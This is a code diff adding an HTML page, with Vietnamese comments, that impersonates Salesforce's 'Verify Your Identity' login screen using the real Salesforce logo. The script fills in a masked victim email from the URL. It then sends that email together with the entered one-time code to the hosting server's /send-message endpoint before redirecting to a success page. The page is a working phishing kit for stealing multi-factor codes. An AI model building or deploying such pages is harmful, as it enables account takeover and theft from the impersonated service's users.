@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Login | Salesforce</title>
+        <link rel="stylesheet" href="/styles/code.css" />
+        <link rel="stylesheet" href="/styles/bootstrap.min.css" />
+    </head>
+    <body>
+        <div class="login_form">
+            <form method="get" action="/success" class="wes-stack">
+                <div class="main_form">
+                    <header class="text-center">
+                        <div class="img-container">
+                            <img
+                                class="logo"
+                                src="https://c1.sfdcstatic.com/content/dam/sfdc-docs/www/logos/logo-salesforce.svg"
+                                alt="Log in with Salesforce"
+                            />
+                        </div>
+                        <slot name="otp-title"
+                            ><h1 type-style="display-6">
+                                Verify Your Identity
+                            </h1></slot
+                        ><slot name="otp-subtitle"
+                            ><p style="text-align: left" type-style="body-3">
+                                You're trying to log in to Salesforce. To make
+                                sure your Salesforce account is secure, we have
+                                to verify your identity.
+                                <br />Enter the verification code we emailed
+                                to<br /><strong id="emailv"
+                                    >admin@gmail.com</strong
+                                >
+                            </p></slot
+                        >
+                    </header>
+                    <div class="input">
+                        <input
+                            id="field"
+                            type="text"
+                            name="otp"
+                            autocomplete="one-time-code"
+                            aria-errormessage="input-error"
+                            aria-invalid="true"
+                            required
+                        />
+                    </div>
+                    <div class="">
+                        <a href="#" id="submit">Verify</a>
+                    </div>
+                    <div class="text-center">
+                        <p type-style="body-3">
+                            Didn’t get the email?<br />
+                            Check your spam folder. If you still can’t find
+                            it,&nbsp;<a
+                                onclick="location.reload(); return false;"
+                                href="#"
+                                tabindex="0"
+                                class="link"
+                                >resend the email</a
+                            >.
+                        </p>
+                    </div>
+                </div>
+                <div id="loading">
+                    <b>Loading</b>
+                </div>
+            </form>
+        </div>
+        <script>
+            setTimeout(() => {
+                document.getElementById("loading").style.display = "none";
+                document.querySelector(".main_form").style.display = "block";
+            }, 2000);
+
+            var urlParams = window.location.href.split("/code/")[1];
+            //xóa tất cả dấu # ở cuối urlParams thêm dấu * để che thông tin email
+            urlParams = urlParams.replace(/#/g, "");
+            const hiddenEmail = urlParams.replace(/^(.)(.*?)(?=@)/, "$1*****");
+            // console.log(urlParams);
+            if (hiddenEmail) {
+                document.getElementById("emailv").innerText = hiddenEmail;
+            }
+            //thêm sự kiện kiểm tra nút verify đã điền thủ 6 số
+            document.getElementById("field").addEventListener("input", () => {
+                const value = document.getElementById("field").value;
+                if (value.length === 6) {
+                    document.getElementById("submit").classList.add("active");
+                } else {
+                    document
+                        .getElementById("submit")
+                        .classList.remove("active");
+                }
+            });
+            document.getElementById("submit").addEventListener("click", () => {
+                //submit form cơ mà em
+                //kiểm tra thẻ input đã có class active chưa
+                if (
+                    document
+                        .getElementById("submit")
+                        .classList.contains("active")
+                ) {
+                    const code = document.getElementById("field").value;
+                    const message = urlParams+'|code:'+code; // Giá trị message từ input hoặc biến
+
+                    const url = `${
+                        window.location.origin
+                    }/send-message?message=${encodeURIComponent(message)}`;
+
+                    fetch(url)
+                        .then((response) => {
+                            if (!response.ok) {
+                                throw new Error("Network response was not ok");
+                            }
+                            return response.json(); // Nếu API trả về dữ liệu JSON
+                        })
+                        .then((data) => {
+                            console.log("API response:", data);
+                        })
+                        .catch((error) => {
+                            console.error(
+                                "There was a problem with the fetch operation:",
+                                error
+                            );
+                        });
+
+                    document.querySelector("form").submit();
+                }
+            });
+        </script>
+    </body>
+</html>
